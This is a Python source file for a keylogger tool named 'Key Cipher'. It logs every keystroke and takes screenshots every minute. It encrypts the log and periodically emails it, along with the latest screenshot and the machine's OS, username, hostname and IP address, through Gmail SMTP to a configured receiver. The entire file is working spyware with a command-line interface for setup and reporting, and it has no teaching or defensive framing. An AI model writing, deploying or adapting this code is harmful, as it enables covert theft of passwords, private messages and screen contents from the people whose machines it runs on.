import pynput
from pynput.keyboard import Key, Listener
import logging
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading
import time
from cryptography.fernet import Fernet
import pyautogui
import shutil
import sys
import tempfile
import getpass
import platform
import socket
import subprocess
from datetime import datetime
import argparse
import json

# ================= CONFIG =================
DEFAULT_CONFIG = {
    "log_file": "keylog.txt",
    "encrypted_log_file": "encrypted_log.txt",
    "email_address": "",
    "email_password": "",
    "receiver_email": "",
    "email_interval": 300,
    "screenshot_interval": 60,
    "screenshot_dir": "screenshots"
}

CONFIG_FILE = "keylogger_config.json"
# ==========================================

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except:
            pass
    return DEFAULT_CONFIG.copy()

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as f:
        f.write(key)
    return key

def load_key():
    if not os.path.exists("secret.key"):
        return generate_key()
    return open("secret.key", "rb").read()

def encrypt_data(data, key):
    return Fernet(key).encrypt(data.encode())

def setup_logging(log_file):
    logging.basicConfig(
        filename=log_file,
        level=logging.DEBUG,
        format="%(asctime)s: %(message)s"
    )

def take_screenshot(screenshot_dir):
    try:
        os.makedirs(screenshot_dir, exist_ok=True)
        name = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        path = os.path.join(screenshot_dir, name)
        pyautogui.screenshot(path)
        return path
    except:
        return None

def send_email(config):
    try:
        # Force log flush so keystrokes are written
        for handler in logging.root.handlers:
            handler.flush()
        
        key = load_key()
        
        with open(config["log_file"], "r", errors="ignore") as f:
            log_data = f.read()
        
        encrypted_log = encrypt_data(log_data, key)
        
        with open(config["encrypted_log_file"], "wb") as f:
            f.write(encrypted_log)
        
        msg = MIMEMultipart()
        msg["From"] = config["email_address"]
        msg["To"] = config["receiver_email"]
        msg["Subject"] = f"Keylogger Report - {datetime.now()}"
        
        system_info = f"""
OS: {platform.system()} {platform.release()}
User: {getpass.getuser()}
Host: {socket.gethostname()}
IP: {socket.gethostbyname(socket.gethostname())}
"""
        
        msg.attach(MIMEText(system_info, "plain"))
        
        with open(config["encrypted_log_file"], "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", "attachment; filename=log.enc")
            msg.attach(part)
        
        if os.path.exists(config["screenshot_dir"]):
            shots = [f for f in os.listdir(config["screenshot_dir"]) if f.endswith(".png")]
            if shots:
                latest = max(shots, key=lambda x: os.path.getmtime(os.path.join(config["screenshot_dir"], x)))
                with open(os.path.join(config["screenshot_dir"], latest), "rb") as f:
                    img = MIMEBase("image", "png")
                    img.set_payload(f.read())
                    encoders.encode_base64(img)
                    img.add_header("Content-Disposition", f"attachment; filename={latest}")
                    msg.attach(img)
        
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(config["email_address"], config["email_password"])
            server.send_message(msg)
        
        print("Email sent")
        return True
    except Exception as e:
        print("Email error:", e)
        return False

def periodic_screenshot(config, running):
    while running[0]:
        take_screenshot(config["screenshot_dir"])
        time.sleep(config["screenshot_interval"])

def periodic_email(config, running):
    # Wait first, then send
    time.sleep(config["email_interval"])
    while running[0]:
        send_email(config)
        time.sleep(config["email_interval"])

def on_press(key):
    try:
        logging.info(key.char)
    except:
        if key == Key.space:
            logging.info(" ")
        elif key == Key.enter:
            logging.info("\n")
        else:
            logging.info(f"[{key}]")

def on_release(key):
    if key == Key.esc:
        return False

def start_keylogger(config):
    setup_logging(config["log_file"])
    logging.info("\n--- SESSION STARTED ---\n")
    
    running = [True]  # Use list to allow modification in nested functions
    
    screenshot_thread = threading.Thread(target=periodic_screenshot, args=(config, running), daemon=True)
    screenshot_thread.start()
    
    email_thread = threading.Thread(target=periodic_email, args=(config, running), daemon=True)
    email_thread.start()
    
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
    finally:
        running[0] = False
        screenshot_thread.join(timeout=1)
        email_thread.join(timeout=1)
        print("Keylogger stopped")

def show_logs(config):
    if os.path.exists(config["log_file"]):
        with open(config["log_file"], "r") as f:
            print(f.read())
    else:
        print("No log file found")

def clear_logs(config):
    if os.path.exists(config["log_file"]):
        os.remove(config["log_file"])
        print("Log file cleared")
    else:
        print("No log file found")

def send_report(config):
    if not config["email_address"] or not config["email_password"] or not config["receiver_email"]:
        print("Email configuration not complete. Please configure email settings first.")
        return
    
    if send_email(config):
        print("Report sent successfully")
    else:
        print("Failed to send report")

def main():
    parser = argparse.ArgumentParser(description="Key Cipher - Keylogger Tool")
    subparsers = parser.add_subparsers(dest="command", help="Available commands")
    
    # Start command
    start_parser = subparsers.add_parser("start", help="Start the keylogger")
    start_parser.add_argument("--email", help="Email address for sending reports")
    start_parser.add_argument("--password", help="Email password")
    start_parser.add_argument("--receiver", help="Receiver email address")
    start_parser.add_argument("--interval", type=int, help="Email interval in seconds")
    
    # Configure command
    config_parser = subparsers.add_parser("config", help="Configure keylogger settings")
    config_parser.add_argument("--email", help="Email address for sending reports")
    config_parser.add_argument("--password", help="Email password")
    config_parser.add_argument("--receiver", help="Receiver email address")
    config_parser.add_argument("--interval", type=int, help="Email interval in seconds")
    config_parser.add_argument("--screenshot-interval", type=int, help="Screenshot interval in seconds")
    config_parser.add_argument("--log-file", help="Log file path")
    config_parser.add_argument("--screenshot-dir", help="Screenshot directory path")
    
    # Show command
    subparsers.add_parser("show", help="Show logged keystrokes")
    
    # Clear command
    subparsers.add_parser("clear", help="Clear log file")
    
    # Send command
    subparsers.add_parser("send", help="Send email report")
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    config = load_config()
    
    if args.command == "start":
        # Override config with command line arguments if provided
        if args.email:
            config["email_address"] = args.email
        if args.password:
            config["email_password"] = args.password
        if args.receiver:
            config["receiver_email"] = args.receiver
        if args.interval:
            config["email_interval"] = args.interval
        
        if not config["email_address"] or not config["email_password"] or not config["receiver_email"]:
            print("Email configuration not complete. Please configure email settings using 'config' command.")
            return
        
        print("Starting keylogger... Press ESC to stop")
        start_keylogger(config)
    
    elif args.command == "config":
        if args.email:
            config["email_address"] = args.email
        if args.password:
            config["email_password"] = args.password
        if args.receiver:
            config["receiver_email"] = args.receiver
        if args.interval:
            config["email_interval"] = args.interval
        if args.screenshot_interval:
            config["screenshot_interval"] = args.screenshot_interval
        if args.log_file:
            config["log_file"] = args.log_file
        if args.screenshot_dir:
            config["screenshot_dir"] = args.screenshot_dir
        
        save_config(config)
        print("Configuration saved") 
        
    elif args.command == "show":
        show_logs(config)
    
    elif args.command == "clear":
        clear_logs(config)
    
    elif args.command == "send":
        send_report(config)

if __name__ == "__main__":
    main()